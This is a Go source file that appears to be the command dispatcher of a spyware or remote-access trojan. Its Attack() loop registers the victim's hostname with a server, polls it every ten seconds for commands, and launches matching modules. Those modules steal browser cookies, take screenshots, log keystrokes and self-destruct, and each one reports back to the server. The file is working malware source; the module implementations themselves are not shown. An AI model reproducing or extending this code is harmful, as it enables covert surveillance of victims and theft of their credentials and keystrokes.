package services

import (
	"fmt"
	"main/network"
	"main/utils"
	"os"
	"regexp"
	"sync"
	"time"
)

type Service interface {
	Start()
	Communicate(victim string)
}

type ClosableService interface {
	Service
	Terminate()
}

const (
	Pending = iota
	Ok
	Error
	NoActionMessage = "No action"
	ActionKey       = "action"
	StopAction      = "stop-(keylog|lazyKeylog)"
)

var (
	actions = map[string]Service{
		"cookies":       &CookieMonster{Mutex: &sync.Mutex{}},
		"screenshot":    &ScreenshotService{Mutex: &sync.Mutex{}, errcode: Pending},
		"self-destruct": &SelfDestruct{},
	}

	stoppableActions = map[string]ClosableService{
		"keylog":     &Keylogger{Mutex: &sync.Mutex{}, Channel: make(chan struct{})},
		"lazyKeylog": &LazyKeylogger{Keylogger{Mutex: &sync.Mutex{}, Channel: make(chan struct{})}},
	}
)

func Attack() {
	name, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting hostname")
	}
	for {
		fmt.Println("Establishing connnection...")
		network.EstablishConnection(name)
		for {
			time.Sleep(10 * time.Second)
			resp, err := network.HandleTextRequest("", "commands", name)
			if err != nil {
				fmt.Println("Error making the request, establishing another request")
				break
			}
			if val, _ := regexp.Match(StopAction, []byte(resp[ActionKey])); val {
				stoppableActions[utils.ParseStopCommand(resp[ActionKey])].Terminate()
			} else if resp[ActionKey] != NoActionMessage {
				if actions[resp[ActionKey]] != nil {
					go actions[resp[ActionKey]].Start()
					go actions[resp[ActionKey]].Communicate(name)
				} else {
					go stoppableActions[resp[ActionKey]].Start()
					go stoppableActions[resp[ActionKey]].Communicate(name)
				}
			}
		}
	}
}
